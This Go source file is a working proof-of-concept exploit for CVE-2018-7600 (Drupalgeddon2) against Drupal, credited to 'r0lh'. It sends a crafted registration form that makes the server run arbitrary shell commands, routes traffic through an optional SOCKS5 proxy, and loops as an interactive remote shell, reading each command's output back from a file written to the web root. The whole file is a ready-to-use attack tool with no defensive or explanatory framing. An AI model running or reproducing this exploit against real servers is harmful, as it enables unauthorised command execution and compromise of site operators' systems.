package main

// CVE-2018-7600

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"

	"golang.org/x/net/proxy"
)

func main() {
	// edit
	host := "http://10.9.15.11"
	useProxy := true
	myProxy := "127.0.0.1:1081"
	//

	target := host + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"

	fmt.Println("CVE-2018-7600 PoC - r0lh")

	client := &http.Client{}

	if useProxy {
		proxy, err := proxy.SOCKS5("tcp", myProxy, nil, proxy.Direct)
		if err != nil {
			log.Fatal(err)
		}
		transport := &http.Transport{Dial: proxy.Dial}
		client.Transport = transport
	}

	for {
		fmt.Printf("$ > ")
		reader := bufio.NewReader(os.Stdin)
		line, err := reader.ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}

		if strings.Contains(line, "exit") {
			os.Exit(0)
		}

		payload := fmt.Sprintf("bash -c \"%s\" | tee poutput.txt", line)
		data := url.Values{
			"form_id":              {"user_register_form"},
			"_drupal_ajax":         {"1"},
			"mail[#post_render][]": {"exec"},
			"mail[#type]":          {"markup"},
			"mail[#markup]":        {payload},
		}

		_, err = client.PostForm(target, data)
		if err != nil {
			log.Fatal(err)
		}

		check, err := client.Get(host + "/poutput.txt")
		if err != nil {
			log.Fatal(err)
		}
		defer check.Body.Close()

		if check.StatusCode != 200 {
			fmt.Println("target not exploitable")
		} else {
			body, err := ioutil.ReadAll(check.Body)
			if err != nil {
				log.Fatal(err)
			}
			fmt.Printf(string(body))
		}
	}

}
